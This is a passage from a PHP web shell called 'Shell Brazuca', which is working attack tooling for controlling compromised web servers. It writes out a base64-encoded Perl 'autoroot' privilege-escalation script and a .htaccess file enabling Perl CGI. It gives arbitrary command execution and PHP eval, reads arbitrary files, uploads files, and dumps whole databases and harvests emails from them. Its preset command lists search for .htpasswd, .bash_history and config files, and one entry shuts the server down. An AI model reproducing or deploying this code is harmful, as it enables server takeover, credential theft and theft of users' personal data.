kZWQvbG9jYWxyb290L1N1bk9TJTIwNS4xMC9zdW5vczUxMCIpOw0Kc3lzdGVtKCJjaG1vZCAreCBzdW5vczUxMCIpOw0Kc3lzdGVtKCIuL3N1bm9zNTEwIik7DQpzeXN0ZW0oImlkIik7DQoNCg0KcHJpbnQgIkVuZCBTdW5PUyAuLlsrXVxuIjsNCn0=";
$criando = fopen("autoroot.pl" ,"w+");
if(fwrite($criando ,base64_decode($exploit)) == TRUE){
echo "Script Autoroot.pl (Perl) successfully created\n\n
placed in: ".realpath(".").$sep."autoroot.pl\n\n";
fclose($criando);
chmod("autoroot.pl",0755);
$htaccess = 'T3B0aW9ucyBJbmNsdWRlcyBJbmNsdWRlc05PRVhFQyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5wbA0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAucGwNCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA==';
$criando = fopen(".htaccess" ,"w+");
$dwrite = fwrite ($criando ,base64_decode($htaccess));
fclose($criando);
echo "A .htaccess file was created for enable perl handler and type all depends on the server\n\n
Use a \"Back Connect\" and go to : ".realpath(".")."\\\n\n
Command: perl autoroot.pl";
}else{ echo "Error to make or save exploit!"; }
echo "</textarea>";
}

}

if($_GET["id"] == 13){   /*************** Sobre **************/
echo "<center>
<font size=\"10\">Shell <font face=\"Segoe Print\" color=\"Green\" >Bra<font color=\"Blue\">z<font color=\"Yellow\">uca</font></font></font></font><hr width=\"50%\">
<font size=\"5\">
Developed by Eduardo<br>
Since ./2014<br><br>
<a href=\"https://twitter.com/eduu4rd0\" target=\"_blank\" title=\"Follow-me\" >
<img width=\"100\" height=\"100\" src=\"http://www.freelogovectors.net/wp-content/uploads/2012/01/pixel-twitter-bird.png\"><br>
@eduu4rd0</a><br><br>
Agrecimentos:<br>
Rei_Gelado / <a href=\"http://caveiratech.com/forum/\" target=\"_blank\">Forum Caveira Tech</a> / <a href=\"http://php.net/\">php.net</a>
</center>";

}

if($_GET["id"] == 8){   /********* Ver (Mini-Bypass) *********/
if(!empty($_POST["modo"])){ $valor = $_POST["modo"]; }else{ $valor = "Nenhum"; }
echo "<font size=\"5\"><center>- Read (mini-bypass) -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
<font size=\"4\">Dir with name of file: </font><input size=\"50\" type=\"text\" name=\"nomeArquivo\" value=\""; if(empty($_POST["nomeArquivo"])){ echo realpath(".").$sep.basename(__FILE__); }else{ echo $_POST["nomeArquivo"]; } echo "\"> > 
<select name=\"modo\" >
<option value=\"".$valor."\">".$valor."</option>
<option value=\"fopen\">fopen</option>
<option value=\"get_file_contents\">get_file_contents</option>
<option value=\"show_source\">show_source</option>
<option value=\"readfile\">readfile</option>
<option value=\"highlight_file\">highlight_file</option>
</select> > In Box? <input type=\"checkbox\" name=\"caixa\" ";
if($_POST["caixa"] == "on"){ echo "checked=\"\""; }
echo " >
<input type=\"submit\" name=\"ler\" value=\"Open\"><br>
<font size=\"2\"><i>( File name is Case Sensitive! )</i></font><br>
</form>";

if (strlen($_POST["nomeArquivo"])>0 and $_POST["ler"]){
$metodo = $_POST["modo"];
if($_POST["modo"] == "Nenhum"){ $metodo = "fopen"; }

echo "<hr size=\"full\">
Name: <font color=\"White\">".basename($_POST["nomeArquivo"])."</font>
<br>Path: <font size=\"4\" color=\"White\">".$_POST["nomeArquivo"]."</font><br>
Size: <font color=\"White\">".tamanho(filesize($_POST["nomeArquivo"]))."</font> // Perm: <font color=\"White\">".substr(sprintf('%o', fileperms($_POST["nomeArquivo"])), -4)."</font><hr size=\"full\">";


 if($metodo=="get_file_contents"){  
  if ($_POST["caixa"] == "on"){ echo "<textarea rows=\"15\" cols=\"100\">"; }
  $conteudo = htmlspecialchars(file_get_contents($_POST["nomeArquivo"])) or die("Error!");
  echo $conteudo;
  if ($_POST["caixa"] == "on"){ echo "</textarea>"; }
  
 }elseif($metodo=="show_source"){
  if ($_POST["caixa"] == "on"){ echo "<textarea rows=\"15\" cols=\"100\" >"; }else{ echo "<div style=\"width: full; background-color: #D3D3D3\">"; }
  $conteudo = show_source(htmlspecialchars($_POST["nomeArquivo"])) or die("Error!");
  if ($_POST["caixa"] == "on"){ echo "</textarea>"; }else{ echo "<div>"; }
  
 }elseif($metodo=="highlight_file"){
  if ($_POST["caixa"] == "on"){ echo "<textarea rows=\"15\" cols=\"100\" >"; }else{ echo "<div style=\"width: full; background-color: #D3D3D3\">"; }
  $conteudo = highlight_file(htmlspecialchars($_POST["nomeArquivo"])) or die("Error!");
  if ($_POST["caixa"] == "on"){ echo "</textarea>"; }else{ echo "<div>"; }
  
 }elseif($metodo=="readfile"){
  if ($_POST["caixa"] == "on"){ echo "<textarea rows=\"15\" cols=\"100\">"; }
  $conteudo = readfile($_POST["nomeArquivo"]) or die("Error!");
  if ($_POST["caixa"] == "on"){ echo "</textarea>"; }
  
 }elseif($metodo=="fopen"){   
  if ($_POST["caixa"] == "on"){ echo "<textarea>"; }    
  $file = fopen ($_POST["nomeArquivo"], "r") or die("Error!");
  while(!feof ($file)){ $pass[$i] = fgets($file, 1024); $i++; } 
  fclose($file);
  $limit = count($pass);
  for($i=0; $i<$limit; $i++){ echo htmlspecialchars($pass[$i]); }
  
  if ($_POST["caixa"] == "on"){ echo "</textarea>"; }  
 } 
}
echo "<br><br>";
}

if($_GET["id"] == 2){   /********** Command Execute **********/
echo "<font size=\"5\"><center>- Command Execute -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
Dir: <input size=\"65\" type=\"text\" name=\"dir\" value=\"";
if($_POST["dir"] != ""){
echo $_POST["dir"];
}else{
echo $_GET["dir"];
}
echo "\"><br>
 ".get_current_user()." ~ <input size=\"50\" type=\"text\" name=\"PHPbox\" value=\"";
if($_POST["PHPbox"] != ""){ echo $_POST["PHPbox"]; }
 echo "\" > > 
<select name=\"modo\">
<option value=\"4\">Automatic</option>"; 
if(function_exists(shell_exec)){ echo "<option value=\"1\">shell_exec</option>"; }
if(function_exists(system)){ echo "<option value=\"2\">system</option>"; }
if(function_exists(passthru)){ echo "<option value=\"3\">passthru</option>"; } echo "
</select>
<input type=\"submit\" value=\"Execute\">
</form>";

if(strlen($_POST["PHPbox"])>2){

 if(strlen($_POST["dir"]) > 3){ 
  $comando = "cd ".$_POST["dir"]." && ".$_POST["PHPbox"];
 }else{
  $comando = $_POST["PHPbox"];
 }

if($_POST["modo"] == 1){
 echo "<textarea>";
 htmlspecialchars(shell_exec($comando)) or die("Error!");
 echo "</textarea>";
  
}

if($_POST["modo"] == 2){
 echo "<textarea>";
 echo htmlspecialchars(system($comando)) or die("Error!");
 echo "</textarea>";
  
}

if($_POST["modo"] == 3){
 echo "<textarea>";
 echo htmlspecialchars(passthru($comando)) or die("Error!");
 echo "</textarea>";

}

if($_POST["modo"] == 4){
 echo "<textarea>";
 htmlspecialchars(executar($comando));
 echo $executou;
 echo "</textarea>";  
}

}
}

if($_GET["id"] == 7){   /********  Lista de Comandos *********/
echo "<font size=\"5\"><center>- Commands List -</center></font><hr size=\"full\"><br>";

if(OS() == "Windows"){
echo "<form method=\"POST\">".get_current_user()." ~ <select name=\"modo\">
<option value=\"\">NONE</option>
<option value=\"dir /s /w /b index.php\">Find index.php in current dir</option>
<option value=\"dir /s /w /b *config*.php\">Find config.php in current dir</option>
<option value=\"netstat -an\">Show Active Connections</option>
<option value=\"net start\">Show runnnig services</option>
<option value=\"net user\">Users Accounts</option>
<option value=\"net view\">Show Computers</option>
<option value=\"arp -a\">ARP Table</option>
<option value=\"ipconfig /all\">IP Config</option>
<option value=\"getmac\">Get Mac Address</option>
<option value=\"systeminfo\">System Informations</option>
<option value=\"start cmd.exe\">Start CMD</option>
<option value=\"shutdown -s -f -t 1\">Turn off the server</option>
<option value=\"tasklist\">Show tasklist</option></select>";
}

if(OS() == "Linux/Unix"){
echo "<form method=\"POST\">".get_current_user()." ~ <select name=\"modo\">
<option value=\"0\">NONE</option>
<option value=\"cat cat /etc/hosts\">Hosts</option>
<option value=\"last -a -n 250 -i\">Show last 250 logged in users</option>
<option value=\"which wget curl lynx w3m\">Downloaders</option>
<option value=\"cat /etc/syslog.conf\">View syslog.conf</option>
<option value=\"lsattr -va\">list file attributes on a Linux second extended file system</option>
<option value=\"netstat -an | grep -i listen\">Show Open Ports</option>
<option value=\"ps auxw\">List of processes</option>
<option value=\"\">Find ----></option>
<option value=\"find / -type f -perm -04000 -ls\">find all suid files</option>
<option value=\"find . -type f -perm -04000 -ls\">find suid files in current dir</option>
<option value=\"find / -type f -perm -02000 -ls\">find all sgid files</option>
<option value=\"find . -type f -perm -02000 -ls\">find sgid files in current dir</option>
<option value=\"find / -type f -name config.inc.php\">find config.inc.php files</option>
<option value=\"find / -type f -name 'config*'\">find config* files</option>
<option value=\"find . -type f -name 'config*'\">find config* files in current dir</option>
<option value=\"find / -perm -2 -ls\">find all folders and files writables</option>
<option value=\"find . -perm -2 -ls\">find all folders and files writable in current dir</option>
<option value=\"find / -type f -name service.pwd\">find all service.pwd files</option>
<option value=\"find . -type f -name service.pwd\">find service.pwd files in current dir</option>
<option value=\"find / -type f -name .htpasswd\">find all .htpasswd files</option>
<option value=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir</option>
<option value=\"find / -type f -name .bash_history\">find all .bash_history files</option>
<option value=\"find . -type f -name .bash_history\">find .bash_history in current dir</option>
<option value=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files</option>
<option value=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir</option>
<option value=\"\">Locate ----></option>
<option value=\"locate httpd.conf\">locate httpd.conf files</option>
<option value=\"locate vhosts.conf\">locate vhosts.conf files</option>
<option value=\"locate proftpd.conf\">locate proftpd.conf files</option>
<option value=\"locate psybnc.conf\">locate psybnc.conf files</option>
<option value=\"locate my.conf\">locate my.conf files</option>
<option value=\"locate admin.php\">locate admin.php files</option>
<option value=\"locate cfg.php\">locate cfg.php files</option>
<option value=\"locate conf.php\">locate conf.php files</option>
<option value=\"locate config.dat\">locate config.dat files</option>
<option value=\"locate config.php\">locate config.php files</option>
<option value=\"locate config.inc\">locate config.inc files</option>
<option value=\"locate config.inc.php\">locate config.inc.php files</option>
<option value=\"locate config.default.php\">locate config.default.php files</option>
<option value=\"locate config\">locate config* files</option>
<option value=\"locate '.conf'\">locate .conf files</option>
<option value=\"locate '.pwd'\">locate .pwd files</option>
<option value=\"locate '.sql'\">locate .sql files</option>
<option value=\"locate '.htpasswd'\">locate .htpasswd files</option>
<option value=\"locate '.bash_history'\">locate .bash_history files</option>
<option value=\"locate '.mysql_history'\">locate .mysql_history files</option>
<option value=\"locate '.fetchmailrc'\">locate .fetchmailrc files</option>
<option value=\"locate backup\">locate backup files</option>
<option value=\"locate dump\">locate dump files</option>
<option value=\"locate priv\">locate priv files</option>
</select>";
}

echo " > <select name=\"exec\">
<option value=\"4\">Automatic</option>"; 
if(function_exists(shell_exec)){ echo "<option value=\"1\">shell_exec</option>"; }
if(function_exists(system)){ echo "<option value=\"2\">system</option>"; }
if(function_exists(passthru)){ echo "<option value=\"3\">passthru</option>"; } echo "
</select>
<input name=\"list\" type=\"submit\" value=\"Execute\"></form>";

if ($_POST["list"]){
if(empty($_POST["modo"])){ echo "<textarea>".$_POST["modo"]."None command selected!</textarea>"; die; }
echo "<textarea>";
echo "ShellBrazuca> ".$_POST["modo"]."\n\n";
switch($_POST["exec"]){
case 1: echo shell_exec($_POST["modo"]); 
case 2: echo system($_POST["modo"]); 
case 3: echo passthru($_POST["modo"]); 
case 4: executar($_POST["modo"]); echo $executou;
}
echo "</textarea>";
}

}

if($_GET["id"] == 6){   /************** Uploader *************/
echo "<font size=\"5\"><center>- Uploader -</center></font><hr size=\"full\"><br>";
echo "<form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">
Dir for upload: <br>
<input size=\"65\" type=\"text\" name=\"nome\" value=\"";
if(is_dir($_GET["dir"])){ echo $_GET["dir"]; }elseif($_POST["nome"]){ echo $_POST["nome"]; }else{ echo realpath(".").$sep; }
echo "\" ><br><br>
<input type=\"file\" name=\"upload\">  
<input type=\"Submit\" name=\"Submit\" value=\"Upload\"><br>
</form>";
if(isset($_POST["Submit"])){
if (is_dir(addbarra($_POST["nome"])) == FALSE){ $semD = "<br><font size=\"2\"><i>( Directory not defined... <b>File in this dir</b>! > <a href=\"".$dispd.$_FILES['upload']['name']."\" >".$dispd.$_FILES['upload']['name']."</a> )</i></font>"; }
if (isset($_FILES['upload']['name'])) {
    $Arquivo = $_POST["nome"].$_FILES['upload']['name'];
    @move_uploaded_file($_FILES['upload']['tmp_name'], $Arquivo);
echo"<font color=\"White\">Arquivo \"upado\" com <font color=\"Green\">Sucess</font>!</font><br>";
}else{
echo "Upload Fail!<br>";
}
echo $semD;
}
}

if($_GET["id"] == 5){   /***************** + *****************/
echo "<font size=\"5\"><center>- + -</center></font><hr size=\"full\">
<font size=\"4\">
Name: $n$n$n$n$n$n$n$n$n";
if(strlen(basename($_GET["vf"])) > 100){ echo "<font size=\"2\">".basename($_GET["vf"])."</font><br>"; }else{ echo basename($_GET["vf"])."<br>"; }
echo "Size: $n$n$n$n$n$n$n$n$n".tamanho(filesize($_GET["vf"]))."<br>
Path: $n$n$n$n$n$n$n$n$n";
if(strlen(basename($_GET["dir"])) > 100){ echo "<font size=\"2\">".$_GET["dir"]."</font>"; }else{ echo $_GET["dir"]; }
echo "<br>
Permission: $n$n$n".substr(sprintf('%o', fileperms($_GET["vf"])), -4)."<br>
Writable: $n$n$n$n$n"; if(is_writable($_GET["vf"])){ echo "<font color=\"Green\">Yes</font>"; }else{ echo "<font color=\"Red\">Not</font>"; } echo "<br>
Readable: $n$n$n$n$n"; if(is_readable($_GET["vf"])){ $ler = 1; echo "<font color=\"Green\">Yes</font>"; }else{ $ler = 0; echo "<font color=\"Red\">Not</font>"; } echo "<br>
Create time: $n$n".date("d/m/Y H:i:s",filectime($_GET["vf"]))."<br>
Access time: $n$n".date("d/m/Y H:i:s",filemtime($_GET["vf"]))."<br><br>";
if($ler == 1){ echo "<a href=\"?id=15&dir=".$_GET["dir"]."&pf=".$_GET["vf"]."&tipo=code\">Open file</a>"; }
echo "</font>";

}

if($_GET["id"] == 9){   /**************** MySQL **************/

if(empty($_GET["op"])){  /******* Menu ********/
echo "<font size=\"5\"><center> - MySQL - </center></font><hr size=\"full\"><br><center>
".estaok("sql", $_GET["dir"])."</center>";
}

if($_GET["op"]=="dmpd"){ /*** Dump Database ***/
echo "<font size=\"5\"><center> - MySQL -<br><font size=\"3\">- Dump Database -</font> </center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\" >
<font size=\"3\">Host: </font><input type=\"text\" name=\"h\" value=\"".$_POST["h"]."\">
<font size=\"3\">User: </font><input type=\"text\" name=\"u\" value=\"".$_POST["u"]."\">
<font size=\"3\">Pass: </font><input type=\"text\" name=\"p\" value=\"".$_POST["p"]."\">
<font size=\"3\">DBName: </font><input type=\"text\" name=\"b\" value=\"".$_POST["b"]."\">
<select name=\"clienteSQL\">
<option value=\"MySQL\">MySQL</option>
</select>
<input name=\"exec\" type=\"submit\" value=\"Execute\">
</form>
";

$host    = $_POST["h"];
$usuario = $_POST["u"];
$senha   = $_POST["p"];
$dbname  = $_POST["b"];
$modo = $_POST["modoE"];
$query = $_POST["q"];

if(isset($_POST["exec"])){

mysql_connect($host,$usuario,$senha) or die("<textarea>".mysql_error()."</textarea>");
mysql_select_db($dbname) or die("<textarea>".mysql_error()."</textarea>");
 $back = fopen("dump_".$dbname.".sql","w");
 $res = mysql_list_tables($dbname) or die("<textarea>".mysql_error()."</textarea>");
 while ($row = mysql_fetch_row($res)) {
 $table = $row[0]; 
 $res2 = mysql_query("SHOW CREATE TABLE $table");
while ( $lin = mysql_fetch_row($res2)){ 
 fwrite($back,"\n\n--> Table > $table\n\n");
 fwrite($back,"$lin[1] ;\n\n--> Information contained in the table\n\n");
 $res3 = mysql_query("SELECT * FROM $table");
while($r=mysql_fetch_row($res3)){ 
 $sql="INSERT INTO $table VALUES (";
for($j=0; $j<mysql_num_fields($res3);$j++){
if(!isset($r[$j])){
 $sql .= " '',";
}elseif($r[$j] != ""){
 $sql .= " '".addslashes($r[$j])."',";
}else{
 $sql .= " '',";
}
}  
 $sql = ereg_replace(",$", "", $sql);
 $sql .= ");\n";
fwrite($back,$sql);
}
}
}
fclose($back);
  $arquivo = "dump_".$dbname.".sql";
echo "<hr size=\"full\">Dump successfully performed!<br>File: <a href=\"?id=15&pf=".realpath(".").$sep.$arquivo.dirlink($_GET["dir"])."&tipo=code\" target=\"_blank\" >".$arquivo."</a> > 
<a href=\"?id=21&vf=".realpath(".").$sep.$arquivo."\">DOWNLOAD</a>";

}

}

if($_GET["op"]=="qe"){   /** Query Execution **/
if(!empty($_POST["sqlC"])){ $valor = $_POST["sqlC"]; }else{ $valor = "MySQL"; }
echo "<font size=\"5\"><center> - MySQL -<br><font size=\"3\">- Query Execution -</font> </center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\" >
<font size=\"3\">Host: </font><input type=\"text\" name=\"h\" value=\"".$_POST["h"]."\">
<font size=\"3\">User: </font><input type=\"text\" name=\"u\" value=\"".$_POST["u"]."\">
<font size=\"3\">Pass: </font><input type=\"text\" name=\"p\" value=\"".$_POST["p"]."\">
<font size=\"3\">DBName: </font><input type=\"text\" name=\"b\" value=\"".$_POST["b"]."\">
<select name=\"sqlC\" >
<option value=\"".$valor."\">".$valor."</option>
"; if(function_exists("mysql_connect")){ echo "<option value=\"MySQL\">MySQL</option>"; } echo "
"; if(function_exists("mssql_connect")){ echo "<option value=\"MsSQL\">MsSQL</option>}"; } echo"
"; if(function_exists("pg_connect")){ echo "<option value=\"PostgreSQL\">PostgreSQL</option>"; } echo "
</select> 
 <input type=\"submit\" name=\"exec\" value=\"Execute\"> <br>
<font size=\"3\">Your Query: <br>
<textarea name=\"q\" >";
if($_POST["q"] == ""){ echo "SHOW DATABASES;"; }else{ echo $_POST["q"]; }
echo "</textarea><br>
</form>";

$host    = $_POST["h"];
$usuario = $_POST["u"];
$senha   = $_POST["p"];
$dbname  = $_POST["b"];
$modo = $_POST["modoE"];
$query = $_POST["q"];

if(isset($_POST["exec"])){
if($valor=="NONE"){ echo "<font color=\"White\">Porfavor, selecione algum cliente sql!</font>"; exit(); }

if($valor=="MySQL"){      /***************** MySQL ******************/
 if(empty($query)){ echo "<textarea>Erro!! : Voce nao colocou nenhum host/usuario!!</textarea>"; die; }
 if(empty($host) or empty($usuario)){ echo "<textarea>Erro!! : Voce nao colocou nenhum host/usuario!!</textarea>"; die; }
 
$coneccao = mysql_connect($host,$usuario,$senha) or die("<textarea>".mysql_error()."</textarea>");
if(!empty($dbname)){ mysql_select_db($dbname, $coneccao) or die("<textarea>".mysql_error()."</textarea>"); }

$resultado = mysql_query($query, $coneccao) or die("<textarea>".mysql_error()."</textarea>"); 
echo "<textarea>";
while($data = mysql_fetch_row($resultado)){ $resultado_query .= implode('|-|-|-|-|-|',$data)."\n"; }
$lim = explode("|-|-|-|-|-|", $resultado_query);
foreach($lim as $lin){
echo $lin."','";
}

mysql_close($coneccao);
echo "</textarea>";

break;
}

if($valor=="MsSQL"){      /***************** MsSQL ******************/
 if(empty($query)){ echo "<textarea>Error!! : You don't have put any query!!</textarea>"; die; }
 if(empty($host) or empty($usuario)){ echo "<textarea>Error!! : You don't have put a host or user!!</textarea>"; die; }
 
$coneccao = mssql_connect($host,$usuario,$senha) or die("<textarea>ERROR!</textarea>");
if(!empty($dbname)){ mssql_select_db($dbname, $coneccao) or die("<textarea>ERROR!</textarea>"); }

$resultado = mssql_query($query, $coneccao) or die("<textarea>ERROR!</textarea>"); 
echo "<textarea>";
while($data=mssql_fetch_row($resultado)){ $resultado_query.=implode('|-|-|-|-|-|',$data)."\n"; }
for($i=0;$i<mssql_num_fields($resultado);$i++)
echo $resultado_query.=mssql_field_name($result,$i);
mssql_close($coneccao);
echo "</textarea>";

break;
}elseif($valor=="Oracle"){
 if(empty($query)){ echo "<textarea>Error!! : You don't have put any query!!</textarea>"; die; }
 if(empty($host) or empty($usuario)){ echo "<textarea>Error!! : You don't have put a host or user!!</textarea>"; die; }
 if(empty($dbname)){ echo "<textarea>Error!! : Oracle need a name for database!"; die; }
 
$coneccao = ocilogon($host,$usuario,$senha,$dbname) or die("<textarea>ERROR!</textarea>");

$resultado = ociparse($query, $coneccao) or die("<textarea>ERROR!</textarea>"); 
ociexecute($resultado,OCI_DEFAULT);
echo "<textarea>";
while($data=ocifetchinto($resultado,$data,OCI_ASSOC+OCI_RETURN_NULLS)){ $resultado_query.=implode('|-|-|-|-|-|',$data)."\n"; }
$lim = explode("|-|-|-|-|-|", $resultado_query);
foreach($lim as $lin){
echo $lin."','";
}
echo "</textarea>";

break;
}

if($valor=="PostgreSQL"){ /*************** PostgreSQL ***************/
if(empty($query)){ echo "<textarea>Error!! : You don't have put any query!!</textarea>"; die; }
if(empty($host) or empty($usuario)){ echo "<textarea>Error!! : You don't have put a host or user!!</textarea>"; die; }
if(empty($dbname)){ echo "<textarea>Error!! : PostgreSQL need a name for database!"; die; }

$coneccao = pg_connect("host=$host dbname=$dbname user=$usuario password=$senha") or die("<textarea>ERROR!</textarea>");

$resultado = pg_query($query, $coneccao) or die("<textarea>ERROR!</textarea>"); 
echo "<textarea>";
while($data=pg_fetch_row($resultado)){ $resultado_query.=implode('|-|-|-|-|-|',$data)."\n"; }
$lim = explode("|-|-|-|-|-|", $resultado_query);
foreach($lim as $lin){
echo $lin."','";
}
pg_close($coneccao);
echo "</textarea>";

break;
}
}

}

if($_GET["op"]=="ems"){  /**** eMail Search ***/
echo "<font size=\"5\"><center> - MySQL -<br><font size=\"3\">- email Search -</font> </center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\" >
<font size=\"3\">Host: </font><input type=\"text\" name=\"h\" value=\"".$_POST["h"]."\">
<font size=\"3\">User: </font><input type=\"text\" name=\"u\" value=\"".$_POST["u"]."\">
<font size=\"3\">Pass: </font><input type=\"text\" name=\"p\" value=\"".$_POST["p"]."\">
<font size=\"3\">DBName: </font><input type=\"text\" name=\"b\" value=\"".$_POST["b"]."\">
<select name=\"clienteSQL\">
<option value=\"MySQL\">MySQL</option>
</select> 
<input type=\"submit\" name=\"exec\" value=\"Execute\"> <br>
</form>";

$host    = $_POST["h"];
$usuario = $_POST["u"];
$senha   = $_POST["p"];
$dbname  = $_POST["b"];
$modo = $_POST["modoE"];
$query = $_POST["q"];

if(isset($_POST["exec"])){

mysql_connect($host,$usuario,$senha) or die("<textarea>".mysql_error()."</textarea>");
mysql_select_db($dbname) or die("<textarea>".mysql_error()."</textarea>");
 $back = fopen("dump_".$dbname.".sql","w");
 $res = mysql_list_tables($dbname) or die("<textarea>".mysql_error()."</textarea>");
 while ($row = mysql_fetch_row($res)) {
 $table = $row[0]; 
 $res2 = mysql_query("SHOW CREATE TABLE $table");
while ( $lin = mysql_fetch_row($res2)){ 
 fwrite($back,"\n\n--> Creating the table > $table\n\n");
 fwrite($back,"$lin[1] ;\n\n--> Data\n\n");
 $res3 = mysql_query("SELECT * FROM $table");
while($r=mysql_fetch_row($res3)){ 
 $sql="INSERT INTO $table VALUES (";
for($j=0; $j<mysql_num_fields($res3);$j++){
if(!isset($r[$j])){
 $sql .= " '',";
}elseif($r[$j] != ""){
 $sql .= " '".addslashes($r[$j])."',";
}else{
 $sql .= " '',";
}
}  
 $sql = ereg_replace(",$", "", $sql);
 $sql .= ");\n";
fwrite($back,$sql);
}
}
}
fclose($back);

 $arquivo = file_get_contents("dump_".$dbname.".sql");

 preg_match_all("/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi", $arquivo, $possiveis);

 $email = array_unique(array_unique($possiveis[0]));

   $back = fopen("emails_".$dbname.".txt","w");
 foreach ($email as $emails){ 
  fwrite($back,"\n".$emails);
  }
  fclose($back);
  $arquivo = "emails_".$dbname.".txt";
  echo "<hr size=\"full\">Search Complete!<br>File: <a href=\"?id=15&pf=".realpath(".").$sep.$arquivo.dirlink($_GET["dir"])."&tipo=code\" target=\"_blank\" >".$arquivo."</a> > 
<a href=\"?id=21&vf=".realpath(".").$sep.$arquivo."\">DOWNLOAD</a>";

  unlink("dump_".$dbname.".sql");

}
}

}

if($_GET["id"] == 4){   /************** Eval PHP *************/ 
echo "<font size=\"5\"><center>- Eval PHP -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
<textarea cols=\"60\" rows=\"10\" name=\"code\">";
if(isset($_POST["code"])){
echo htmlspecialchars($_POST["code"]);
}elseif(strlen($_POST["code"])==0){ 
echo "echo \"Ola Mundo\";";
}else{
echo $_POST["code"];
}
echo "</textarea><br>
<input type=\"submit\" value=\"Eval\">
In box? <input type=\"checkbox\" name=\"caixa\" "; if($_POST["caixa"] == "on"){ echo "checked=\"\""; }
echo " ></form>";
if(isset($_POST["code"])){
if($_POST["caixa"] == "on"){ echo "<textarea>"; }else{ echo "<hr width=\"100%\">"; }
eval($_POST["code"]);
}
}

if($_GET["id"] == 1){   /*************** SAIR ****************/
setcookie ($senha[2], "", time()-3600);
header("Location: ".basename(__FILE__));
}

if($_GET["id"] == 0){   /************* Suicidio **************/
echo "<center>
<form action=\"\" method=\"POST\">
<font size=\"4\">Kill-me ? ='(<br>[ <input name=\"SuicidioAgora\" type=\"submit\" value=\"Yes\"> ]<br>
</form>";

if (isset($_POST["SuicidioAgora"])){
echo "Goodbye old friend :')";
unlink(__FILE__);
}

}


?>
